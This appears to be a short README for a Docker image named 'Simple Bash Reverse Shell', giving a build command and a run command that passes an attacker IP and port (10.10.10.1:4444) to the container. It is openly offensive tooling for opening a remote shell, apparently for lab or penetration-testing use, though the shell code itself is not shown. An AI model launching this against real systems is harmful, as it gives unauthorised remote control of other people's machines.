# Simple Bash Reverse Shell

Build

```bash
docker build -t wakeward/bash-rs:latest .
```

Run

```bash
docker run --rm -it -e IP=10.10.10.1 -e PORT=4444 wakeward/bash-rs:latest
```